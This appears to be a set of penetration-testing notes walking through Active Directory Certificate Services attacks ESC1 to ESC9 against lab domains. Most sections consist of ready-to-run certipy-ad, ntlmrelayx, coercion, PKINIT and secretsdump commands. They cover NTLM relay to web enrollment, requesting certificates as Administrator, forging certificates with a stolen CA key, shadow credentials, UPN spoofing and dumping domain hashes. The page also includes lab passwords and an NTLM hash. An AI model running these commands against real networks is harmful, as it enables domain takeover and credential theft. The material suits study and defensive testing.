----------------

### AD_CS ESC8

----------------

- ESC8 (exposed certsrv)-:
- Recon with `certipy-ad` -:

```bash
certipy-ad find -u "jtrueblood" -p "blood_brothers" -dc-ip "10.1.57.249" -vulnerable -enabled
```

<img width="1113" height="540" alt="image" src="https://github.com/user-attachments/assets/1cfff4e5-503f-4a2f-9b10-dbe41b7f9b57" />

- Grepping for the vulnerable ADCS's ESC which is ESC8 (web enrollment version exposed via http)-:

```bash
cat *.txt | grep "ESC"

```
<img width="829" height="108" alt="image" src="https://github.com/user-attachments/assets/c660c81f-927a-404a-80cb-24c66170b969" />

- ESC8 is a vulnerability related to ADCS Web Enrollment. ADCS Web Enrollment is a feature that deploys a web server, enabling clients to request a certificate template. This web server supports NTLM authentication, making it susceptible to relay attacks. For this attack to succeed, you must know a valid template name to enroll in. Fortunately, ADCS comes with several default enabled templates that can be used, including ‘User,’ ‘Machine,’ and ‘DomainController.’ These templates are fairly self-explanatory: ‘User’ is for Domain Users, ‘Machine’ is for Domain Computers, and ‘DomainController’ is for Enterprise Domain Controllers.
- Exploiting with `impacket-ntlmrelayx`-:

```bash
impacket-ntlmrelayx -t http://10.1.57.249/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

<img width="1318" height="696" alt="image" src="https://github.com/user-attachments/assets/3a9d7f78-a46c-4219-90cd-6794e0843feb" />

- Later, you have to use the printer bug to coerce authentication

```bash
nxc smb 10.1.57.249 -M coerce_plus -o LISTENER="10.200.88.20"
```

<img width="1561" height="142" alt="image" src="https://github.com/user-attachments/assets/86960c6f-4da7-4d3a-9151-aeca6cf866b3" />

- Certificate for machine `DC01$` received

<img width="1057" height="361" alt="image" src="https://github.com/user-attachments/assets/93cd80a1-813b-44ec-9329-d52be7ae4549" />

- Convert to ticket grant ticket with `pkinttools`-:

```bash
python3 gettgtpkinit.py -cert-pfx DC01.shadow.gate.pfx -dc-ip 10.1.57.249 shadow.gate/dc01$ admin.ccache
```
<img width="1124" height="193" alt="image" src="https://github.com/user-attachments/assets/c3f8b78f-3592-4c11-b639-7b4882f69390" />

- Dump secrets with `impacket-secrets-dump`

```bash
impacket-secretsdump -k -no-pass dc01.shadow.gate
```

<img width="1031" height="523" alt="image" src="https://github.com/user-attachments/assets/fc622cf9-79cd-48bf-827e-94e2c0ced536" />

------------

### ADCS ESC1

-------------

- This issue occurs in Certificate Template Management (certtmpl.msc) under the “Request Handling” settings in the template. The mistake is that the “Supply in the request” option allows users to specify any Subject Alternative Name (SAN), enabling attackers to request certificates for Administrator, Domain Admins, or service accounts.The other issue is also making it accessible to nay domain users.
- Custom ESC1-:

<img width="1170" height="959" alt="image" src="https://github.com/user-attachments/assets/29b84e91-0e2e-4d0e-91a9-b02148277ce4" />

- Exploitation with certipy-ad, request certificate as administrator-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'Custom_ESC1' -upn 'administrator@papa.local'
```
<img width="1083" height="335" alt="image" src="https://github.com/user-attachments/assets/8c555bb5-1b25-4145-af0b-ad2fa6c62dc3" />

- Authenticating as Administrator to get ntlm hash or ticket-:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136
```

<img width="1160" height="344" alt="image" src="https://github.com/user-attachments/assets/9920db31-bcf6-4a8a-8f27-f6bf0c453b44" />

- Evil-winrm-:

<img width="1302" height="326" alt="image" src="https://github.com/user-attachments/assets/0c6682ab-284d-46eb-9cad-15965709e13d" />

------------------

### ADCS 2

------------------

- ESC2 (Escalation Path 2) is a vulnerability in Active Directory Certificate Services (AD CS) where a certificate template allows low-privileged users to enroll, and the template includes dangerous Extended Key Usages (EKUs) like:

 - Client Authentication (1.3.6.1.5.5.7.3.2)
 - Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
 - Any Purpose (2.5.29.37.0)
- These EKUs enable the attacker to request a certificate and authenticate as a different user via Kerberos (PKINIT), bypassing passwords entirely. 

- Run the `certipy-ad find`
- Grep for "ESC2" and spot the necessary `ANY PURPOSE` detail and also `domain users` for enrollment rights-:

<img width="1038" height="965" alt="image" src="https://github.com/user-attachments/assets/d2885e45-0bd4-43d3-933a-ed71351243a8" />

- Request certificate for your own user `dev`-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'ESC2'
```
<img width="1408" height="301" alt="image" src="https://github.com/user-attachments/assets/8dbb1c16-5308-4915-a693-dcf2fd06174a" />

- Request for administrator next-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'User' -on-behalf-of administrator -pfx dev.pfx
```

<img width="1660" height="322" alt="image" src="https://github.com/user-attachments/assets/7abe2697-2174-4f0e-a455-6681a7c4cb16" />

- Authenticate again-:

```bash
certipy-ad auth -pfx administrator --dc-ip <ip>
```
<img width="1158" height="392" alt="image" src="https://github.com/user-attachments/assets/b2fd19d4-a13b-48b4-b902-aff34201f1fb" />

-----------------------

### ESC4

------------------------

- ESC4 Active Directory Certificate Services Vulnerability is a high-risk vulnerability in Active Directory Certificate Services (ADCS) that enables attackers to exploit misconfigured certificate template permissions (e.g., Write, GenericAll, WriteDACL). This flaw serves as a critical entry point for a certificate attack. By modifying vulnerable templates, attackers can issue authentication certificates with Client or Server Authentication EKU, allowing them to impersonate privileged users or systems (e.g., Domain Admins, Domain Controllers) using Kerberos PKINIT.
- The ESC4 attack in ADCS arises due to misconfigured Access Control Entries (ACEs) on certificate templates. When these ACEs grant unintended or unprivileged Active Directory users the ability to modify the security settings of a certificate template, attackers can gain control over the template, enabling them to issue certificates with elevated privileges. This attack is particularly dangerous when attackers can leverage certificates with the Server Authentication EKU (Extended Key Usage) to impersonate trusted servers, such as Domain Controllers, and gain unauthorized access to sensitive resources.
- Requirements-:
  - True – Low-privileged user has Write/Owner/Modify permissions on a certificate template (e.g., WriteOwner, WriteDacl, WriteProperty).
  - True – Low-privileged user has Enroll or Autoenroll permission on the vulnerable template.
  - True – The template allows specifying a custom Subject Alternative Name (SAN) (e.g., to spoof a Domain Controller FQDN).
  - True – The template includes or can be modified to include Server Authentication EKU (3.6.1.5.5.7.3.1).
- Dangerous privileges highlighted in certipy's response.

<img width="1174" height="889" alt="image" src="https://github.com/user-attachments/assets/1e98e06d-c86c-4a8c-8480-d84cf3c63969" />

- Leveraging the template dangerous permissions, we'll leverage the permissions to make it more dangerous.

```bash
certipy-ad template   -u dev@papa.local   -p password   -template ESC4   -write-default-configuration \  -no-save 
```

<img width="1885" height="644" alt="image" src="https://github.com/user-attachments/assets/dc082b3e-0724-4756-91b8-a516513b4b3a" />

>-write-default-configuration enables ENROLLEE_SUPPLIES_SUBJECT and configures Client Authentication EKU making the template ESC1-vulnerable.
-no-save skips saving a backup of the original configuration (omit this flag in real engagements to preserve the ability to restore).

-  Exploiting ESC1 again-:

<img width="1748" height="344" alt="image" src="https://github.com/user-attachments/assets/9a280bb5-9a53-4062-9f95-8ba911075353" />

- Auth as administrator-:

```bash
certipy-ad auth --pfx administrator.pfx --dc-ip ip
```

<img width="1172" height="363" alt="image" src="https://github.com/user-attachments/assets/dd5deae8-65a4-429b-955b-0e262639bd24" />


----------

### ESC 5: : Vulnerable PKI Object Access Control

------------

- ESC5 is a high-risk certificate attack targeting Active Directory Certificate Services (ADCS). This ADCS attack exploits insecure access to the Certificate Authority (CA)’s private key. When attackers gain local admin access on the CA server, they can export the private key. This allows them to forge valid certificates for any AD account, including Domain Admins. This certificate attack allows adversaries to authenticate via Kerberos PKINIT, enabling lateral movement across the network without needing passwords or hashes
- User must be part of Domain Admins:
- Fist step is to back up CA certificate and Private key-:

```bash
certipy-ad ca -backup -u administrator@papa.local -p hello -ca LAB-ROOT-CA -target 192.168.130.136
```

<img width="1044" height="390" alt="image" src="https://github.com/user-attachments/assets/171d4e2c-a820-4c50-a071-c91d5728c822" />

- Forge a certificate for a user-:

```bash
certipy-ad forge -ca-pfx 'LAB-ROOT-CA.pfx' -upn Administrator@papa.local -sid "S-1-5-21-1749148288-4111076168-2771517274-500"
```

<img width="785" height="177" alt="image" src="https://github.com/user-attachments/assets/6c4da703-82ba-4b14-9967-602ba93b5475" />

- Authenticating for ntlm hash-:

```bash
certipy-ad auth -pfx administrator_forged.pfx -dc-ip 192.168.130.136
```

<img width="1163" height="402" alt="image" src="https://github.com/user-attachments/assets/414dbed1-27c8-4986-aec0-1927b1c8a61b" />


-------------------

### ESC6:  Editf_attributesubjectaltname2

------------------

- ESC6 is a privilege escalation attack that exploits misconfigured certificate templates and CA settings. Consequently, it allows attackers to impersonate privileged users using legitimate certificates, bypassing brute-force or zero-day methods.
- Requirements-:
 - SAN Injection: ESC6 exploits the SAN request attribute (+EDITF_ATTRIBUTESUBJECTALTNAME2 flag) to add additional hostnames, typically used for webserver certificates.
 - CA-Wide Vulnerability: The flag applies globally, making any certificate template open to user enrollment exploitable.
 - Impersonating Privileged Users: Attackers can issue certificates with a Domain or Enterprise Admin as an additional UPN, impersonating high-privilege users.
 - Unprivileged User Enrollment: Attackers can enroll through open templates (e.g., standard User template) to authenticate as domain administrators or other privileged entities.

- The EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag modifies CA behavior to allow certificate requesters to manually specify the Subject Alternative Name (SAN) field during enrollment.This includes identities like UPNs (e.g., administrator@ignite.local), DNS names, IPs, and email addresses. When enabled, it lets users inject custom SANs such as privileged UPNs making it a key enabler in ESC6 attacks.In an ESC6 attack, this flag is crucial. When enabled, it lets attackers request certificates with a privileged user’s UPN. If combined with a misconfigured template, the CA issues a valid certificate, grant the attacker to impersonate and authenticate as that user.By default, Active Directory auto-fills SAN fields based on the requester’s identity. However, with the flag enabled, requesters gain control over the SAN, thereby creating a path for abuse.
- Exploiting it requires requesting a malicious cert as a low priv user-:

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'User' -upn 'administrator@papa.local'
```

<img width="1672" height="299" alt="image" src="https://github.com/user-attachments/assets/112edbee-a263-41bd-ae4e-40a692b26017" />

- Auth-:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136 
```

<img width="1009" height="306" alt="image" src="https://github.com/user-attachments/assets/5e2837ba-1e64-4beb-aef5-4480226619ba" />

------------------

### ESC 7: Vulnerable Certificate Authority Access Control

-------------------

- ESC7 is a critical security vulnerability where attackers exploit weak access controls within Certificate Authorities (CAs). By targeting key permissions like ManageCA and Manage Certificates, attackers can compromise certificate management systems. The ManageCA permission grants administrative control, allowing attackers to modify settings like EDITF_ATTRIBUTESUBJECTALTNAME2 and exploit vulnerabilities such as ESC6 using PSPKI cmdlets. Meanwhile, ManageCertificates enables attackers to bypass certificate issuance checks, weakening security.
- Exploiting it-:

- Running `certipy-ad find` to find issues-:

<img width="1365" height="456" alt="image" src="https://github.com/user-attachments/assets/b46ff150-a163-48f8-bf8b-256201860dae" />

- Abusing `ManageCA` by adding a certificate officer-:

```bash
certipy-ad  ca -ca LAB-ROOT-CA -add-officer dev -u dev@papa.local -p password -target 192.168.130.136 -dc-ip 192.168.130.136
```

<img width="1354" height="157" alt="image" src="https://github.com/user-attachments/assets/101d651d-ca0e-4fd7-806d-ed8963176240" />

- Add a vulnerable template

```bash
certipy-ad ca -ca LAB-ROOT-CA -u dev@papa.local -p password -target 192.168.130.136 -enable-template SubCA -dc-ip 192.168.130.136
```

<img width="1309" height="147" alt="image" src="https://github.com/user-attachments/assets/f0b0ac1d-0615-4cd7-86a5-1ff7e352dbe3" />

- Find enabled templates-:

```bash
certipy-ad find -u "dev" -p "password" -dc-ip "192.168.130.136" -enabled
```

<img width="1055" height="825" alt="image" src="https://github.com/user-attachments/assets/3eff98c9-7a06-481b-9e4e-7454a5183110" />

- Sometimes, you can request for certificate straight up but you might be restricted at times.

```bash
certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'SubCA' -upn 'administrator@papa.local'
```

<img width="1905" height="278" alt="image" src="https://github.com/user-attachments/assets/815b7684-9461-41a0-973f-a6ce980f9f6c" />

- Issue and retrieve it-:
  - Issuing it, however, armed with the necessary CA permissions, we can bypass restrictions by either forcing or manually approving the Certificate Authority (CA) to authorise the certificate request.
    ```bash
    certipy-ad ca  -u dev@papa.local -p password -ca LAB-ROOT-CA -target 192.168.130.136 -issue-request 8 -dc-ip 192.168.130.136
    ```
    <img width="1421" height="147" alt="image" src="https://github.com/user-attachments/assets/d45a4abe-c0d0-4642-b629-3d767009ad92" />
  - Now, reissue it, note your request id-:

  ```bash
  certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'SubCA' -retrieve 8 
  ```
  <img width="1910" height="307" alt="image" src="https://github.com/user-attachments/assets/afdc2411-7fdd-444d-a350-e9cbd844e672" />

- When you try to auth with that cert, you'll get this error `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`
- Use `passthecert`-:
  - Generate certificate and public key-:

  ```bash
  certipy cert -pfx user.pfx -nokey -out user.crt
  certipy cert -pfx user.pfx -nocert -out user.key
  ```

  -  Use `ldap_shell`-:

  ```bash
  python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain papa.local -dc-ip 192.168.130.136
  ```
  - Fix if it is your personal DC

  <img width="505" height="248" alt="image" src="https://github.com/user-attachments/assets/06a16766-3309-4203-9884-4a18afa2a39b" />

- 


------------------

### ESC 9

-------------------

- Run certipy-ad to show existence of
  - Template Name: ESC9
  - Enrollment Flag: NoSecurityExtension
  - Enrollment Rights: Includes Domain Users
  - Vulnerabilities: Marked explicitly as ESC9

<img width="1115" height="840" alt="image" src="https://github.com/user-attachments/assets/58df987f-4777-448b-9c3a-19ef416061c0" />

- This demonstrates that any user in the Domain Users group (like raj) can enroll a certificate from this template and that no certificate security extensions enforce any rules. These conditions are exactly what one needs to proceed with an ESC9-based impersonation.
- Gain access to a writable account (proxy),(you must have `GenericWrite` over it) by injecting a shadow credential:

```bash
certipy-ad shadow auto -u dev -p 'password' -account "matt" -dc-ip 192.168.130.136 -debug 
```

<img width="1661" height="976" alt="image" src="https://github.com/user-attachments/assets/f682a65f-d502-4ef7-9009-cb97a44fa8d1" />


- Spoof UPN of Proxy account-:

```bash
certipy-ad account update -u 'dev' -p 'password' -dc-ip 192.168.130.136 -user 'matt' -upn 'Administrator@domain.local'
```
<img width="1398" height="184" alt="image" src="https://github.com/user-attachments/assets/09b5c4b5-61e9-4eb6-83e3-41e286866f00" />

 - Request cert as administrator with the target user's hash using the vulnerable template-:

```bash
certipy-ad req -u matt@papa.local -hashes e8cd0e4a9e89eab931dc5338fcbec54a  -ca LAB-ROOT-CA -template ESC9 -dc-ip 192.168.130.136
```

<img width="1391" height="344" alt="image" src="https://github.com/user-attachments/assets/5561c171-fa6a-4283-8b14-1d8158e906e0" />

-  Revert UPN changes-:

```bash
certipy-ad account update -u dev@papa.local -password 'password' -user 'matt' -upn matt@papa.local -dc-ip 192.168.130.136
```

<img width="1342" height="217" alt="image" src="https://github.com/user-attachments/assets/f595af7c-d5d8-40d0-9712-bbcea6be707c" />



